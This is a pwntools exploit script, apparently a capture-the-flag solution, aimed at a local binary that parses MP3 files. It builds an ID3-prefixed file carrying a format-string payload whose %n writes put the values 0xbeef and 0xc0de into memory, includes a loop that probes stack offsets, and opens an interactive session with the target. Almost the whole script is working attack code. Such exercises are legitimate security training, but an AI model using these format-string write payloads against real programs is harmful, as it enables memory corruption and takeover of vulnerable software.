#!/usr/bin/python3

from pwn import *

exe = ELF("./main", checksec=False)
libc = ELF("./glibc/libc.so.6", checksec=False)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "ERROR"
isDebug = False

# brva 0x00000000000015B0 before printf(format)
# brva 0x0000000000001512 before reading 0x16 bytes into format
gs = '''
break main
break is_mp3
break *0x5555555555bc
brva 0x00000000000015B0
brva 0x0000000000001512
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def prepareInputFile(format_variable: bytes = b''):

	magic_bytes = b'ID3'
	
	payload = flat(
		magic_bytes,
		format_variable
	)

	with open("/tmp/test.mp3", "wb") as f:
		f.write(payload)


def find_offset_to_memory_of_beef1337():
	for i in range(1, 20):
		format_variable = f"%{i}$s".encode()
		prepareInputFile(format_variable)
		io = start_local(isDebug)
		response = io.clean()
		response = f"[{i}] ".encode() + response
		print(response)

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

beef = 48879 #(0xbeef)
code = 49374 - beef #(0xc0de)
format_variable = f"%{beef}c".encode() + b"%12$n" + f"%{code}c".encode() + b"%13$n" 
prepareInputFile(format_variable)

io = start_local(isDebug)
io.timeout = 0.1
io.interactive()
